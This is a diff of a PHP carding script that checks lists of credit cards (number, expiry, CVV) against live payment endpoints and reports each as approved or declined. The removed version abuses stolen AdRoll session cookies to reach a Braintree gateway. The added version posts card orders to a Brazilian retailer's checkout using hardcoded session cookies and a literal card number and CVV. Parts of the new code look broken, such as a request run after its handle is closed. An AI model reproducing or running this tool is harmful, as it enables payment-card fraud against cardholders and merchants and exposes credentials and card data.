@@ -2,10 +2,7 @@
 error_reporting(1);
 set_time_limit(0);
 date_default_timezone_set('America/Sao_Paulo');
-
-## PEGAR COOKIES DO APP.ADROLL.COM E A URL https://app.adroll.com/payment-methods/?advertisable=ADVERTISABLE&account=ACCOUNT_ID&hide_buttons=false&set_primary=false
-
-$email = 'cyberang'.rand(10, 100000).'%40gmail.com';
+$email = 'cybersec'.rand(10, 100000).'%40gmail.com';
 $useragent = "Mozilla/5.0 (Windows NT " . rand(6, 10) . ".0; Win64; x64) AppleWebKit/" . rand(500, 600) . ".0 (KHTML, like Gecko) Chrome/" . rand(100, 120) . ".0." . rand(4000, 5000) . "." . rand(100, 300) . " Safari/" . rand(500, 600) . ".0";
 
 function getStr($string, $start, $end)
@@ -24,8 +21,8 @@ $ano = $separar[2];
 $ano2 = substr($ano, -2);
 $cvv = $separar[3];
 
-if (file_exists("cybergang.txt")) {
-    unlink("cyberang.txt");
+if (file_exists("cybersecofc.txt")) {
+    unlink("cybersecofc.txt");
 }
 
 $digito = substr($cc, 0, 1);
@@ -69,46 +66,42 @@ function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "
 $account_id = 'CCIV346S35H4TJM5ZVVIBY';
 $advertisable = 'ICHY4TAYYZFTTAIFRFDMJR';
 
+
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, "https://app.adroll.com/api/v1/account/gateway_credentials/$account_id?_escape=false");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_URL, 'https://www.thecasa.com.br/checkout/GerarPedidoCompletocurl');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
-'Accept: */*',
-'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-'Cookie: __zlcmid=1VqoFdzPcPTTTLh; adroll_jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI3R1lXTVhEWFNKR01aTllITVNYVEFRIiwiaXNzIjoiaHR0cHM6Ly9hcHAuYWRyb2xsLmNvbSIsImF1ZCI6Imh0dHBzOi8vYXBwLmFkcm9sbC5jb20iLCJuYmYiOjE3NzA0ODA2MTIsImlhdCI6MTc3MDQ4MDYxMiwianRpIjoiSDJMREhFVFRQQkFIN0pHV1U2TDdPVyIsImJyb3dzZXJfZmluZ2VycHJpbnQiOiIkYXJnb24yaWQkdj0xOSRtPTE2Mzg0LHQ9MixwPTEkWWF6ei9NelpWZjAkeEFxNkJ4cU00cjlJdndJV3ZDaTdTdyIsInJlbWVtYmVyX3VzZXJfZGV2aWNlIjp0cnVlLCJyZW1lbWJlcl91c2VyX2RldmljZV9kYXRlIjoxNzcwNDgwNjEyfQ.42q0mRVixZc1FNqb64c8zdsc4Yfd7bCVLWWZiFbMmJk; g_state={"i_l":0,"i_ll":1770582595321,"i_b":"rNIBGyT2FOjtizab7tUxsWTfJQ+IkcEMW5bbsmKOhKY","i_e":{"enable_itp_optimization":3}}; csrftoken=6979effe1919b2fc2a82773766a3a367; adroll=43b7d9837725e7089ce97fe77487b7d05ea7dac19f37111125464422b5d75d595f27330c; adroll-ai-c2-7GYWMXDXSJGMZNYHMSXTAQ-ICHY4TAYYZFTTAIFRFDMJR=%7B%22conversationRef%22%3A%7B%22mode%22%3A%22general%22%2C%22forcedToolCalls%22%3A%5B%5D%7D%2C%22ts%22%3A1770582620637%7D; AWSALB=puFqdIp/1ZzRtG9011yBHkHKWc+Euwx9KiuA5tGrwlweFcj/cKHHTbtKwQY1CtxujCIM2g9PLvpdyUFpEY6ZjT4+cvs7BHMczUNOaaiBwg6+T9SJqJH/Ujh7ZXsH; _dd_s=rum=1&id=21e49044-b9d3-499e-ba3a-5d7999e61eff&created=1770582594085&expire=1770583755171',
-"Referer: https://app.adroll.com/payment-methods/?advertisable=$advertisable&account=$account_id&hide_buttons=false&set_primary=false&lang=en_US",
-'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
-'X-CSRF-Token: 6979effe1919b2fc2a82773766a3a367',
-'sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-'sec-ch-ua-mobile: ?0',
-'sec-ch-ua-platform: "Windows"'
+    'Host: www.thecasa.com.br',
+    'sec-ch-ua-platform: "Windows"',
+    'X-Requested-With: XMLHttpRequest',
+    'Origin: https://www.thecasa.com.br',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-Mode: cors',
+    'Sec-Fetch-Dest: empty',
+    'Referer: https://www.thecasa.com.br/',
+    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Accept-Encoding: gzip',
 ]);
+curl_setopt($ch, CURLOPT_COOKIE, 'ASP.NET_SessionId=ljzgud3nvjqwpsuzcd5mwift; _gid=GA1.3.107117654.1770583152; _clck=4aogfj%5E2%5Eg3e%5E0%5E2230; _fbp=fb.2.1770583152164.762989425308959098; PolicyPrivacyAccepted=true; SessionIdCookie=jgpcRDl1cxfDtlL5UllUXg%3d%3d; _lfi=3; _lfe=3; _lf={%22lm%22:false%2C%22_ga%22:%22dfb07e5a-fbc9-4260-82b8-b90af60539a2%22%2C%22e%22:%22Y3liZXJzZWNvZmNAZ21haWwuY29t%22}; __udf_j=e317bb5c307bfb62f4ae4f5a9dc4a0e9b1010df7d854e5b1cfc067543147cdfa7e8478c29388bbbbff80ba4beb6e735d; __csfpsid_3508436101=Mjk0MDA2NTkwNA==; IdTablePrice=0; __RequestVerificationToken=U31CHQpAwkZQl-4eLoWoTNsDK9KNfKgN3agNVXp4ajgvkpwpAG4cYh_r0vSM5xssiTxVH4jXHsJV5pMpsVI_j1zRfV_p22HoFbNb2bwWFR41; _mbt_ses.90c4=*; CartInfo=rjEnf3JnDSJgLjtbIzHEMp4emKaHQnhIOEXLCiz0Us8%2fgbcg1Cq8VTH4sGCe7rakPxMZV%2fGmJK5fNNs%2bzRGWXg%3d%3d; _ga_783V77DBG5=GS2.1.s1770587207' . getenv('o2') ?? '' . getenv('g1') ?? '' . getenv('t1770589075') ?? '' . getenv('j48') ?? '' . getenv('l0') ?? '' . getenv('h1405780657') ?? '' . '; _ga=GA1.3.393016631.1770583152; _clsk=grtbvq%5E1770589077471%5E15%5E1%5Es.clarity.ms%2Fcollect; _mbt_id.90c4=c9413a96-71df-407a-8bd6-cc02887f9360.1770583154.2.1770589083.1770584680.9dfda74e-eb45-4020-be17-8733e2076a06; _enviou.com-ca={%22tk%22:%2214042022081931ZTT%22%2C%22v%22:99.55%2C%22ci%22:%226988f49c7a176e63076ab249%22%2C%22n%22:%22Cyber%20Sec%22%2C%22e%22:%22Y3liZXJzZWNvZmNAZ21haWwuY29t%22%2C%22h%22:%22(31)%2098745-6326%22%2C%22f%22:23.9}; _gcl_au=1.1.530025718.1770583150.117093932.1770587216.1770589090');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'idCustomer=7017271&idAddress=50873338&presente=off&mensagem=&idInstallment=237515&idPaymentBrand=209&card=4854+6412+4734+4120&nameCard=CYBER+SEC&expDateCard=06%2F2028&cvvCard=401&brandCard=visa&installmentNumber=1&kind=credit&document=&idOneClick=0&saveCardOneClick=false&userAgent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F142.0.0.0+Safari%2F537.36+OPR%2F126.0.0.0&hasScheduledDelivery=False&paymentSession=&paymentHash=&shippingMode=3&dateOfBirth=&phone=&installmentValue=0&installmentTotal=99.55&cardToken=&googleResponse=&deliveryTime=5&usefulDay=false&labelOneClick=&typeDocument=&colorDepth=24&screenHeight=900&screenWidth=1600');
+
 $response = curl_exec($ch);
-$clientToken = json_decode(base64_decode(json_decode($response, true)['results']['braintree_client_token']), true);
 
-$bearer = explode('?', $clientToken['authorizationFingerprint'])[0];
-$sessionId = bin2hex(random_bytes(16));
+curl_close($ch);
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/527r4khfxhmb694m/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=3.98.2&authorizationFingerprint=' . urlencode($bearer) . '%3Fcustomer_id%3D&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=' . $sessionId . '&share=undefined&&creditCard%5Bnumber%5D=' . $cc . '&creditCard%5BexpirationDate%5D=' . $mes . '%2F' . $ano . '&creditCard%5Bcvv%5D=' . $cvv . '&creditCard%5Boptions%5D%5Bvalidate%5D=true&_method=POST&callback=callback_json02178bb076b649fc90cb4090f031a2a6');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cybergang.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cybergang.txt');
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: */*',
-'Referer: https://app.adroll.com/',
-'User-Agent:' . $useragent
-));
+
+
 $resultado = curl_exec($ch);
 
 if(strpos($resultado, 'nonce') !== false) {
-  cyber("💸", "Aprovada", $lista, "[ Cartão vinculado com sucesso. ]");
+  cyber("✅", "Aprovada", $lista, "[ Invalid security code. ]");
 
 }elseif(strpos($resultado, 'error') !== false) {
-  cyber("❌", "Reprovada", $lista, "[ Cartão recusado pelo emissor. ]", "#ff3366", "#ff3366");
+  cyber("⛔", "Reprovada", $lista, "[ Cartão recusado pelo emissor. ]", "#ff3366", "#ff3366");
 
 }else{
-  cyber("❌", "Reprovada", $lista, "[ Erro Desconhecido. ]", "#ff3366", "#ff3366");
+  cyber("⛔", "Reprovada", $lista, "[ Falha ao gerar o pré pedido. ]", "#ff3366", "#ff3366");
 }
 ?>
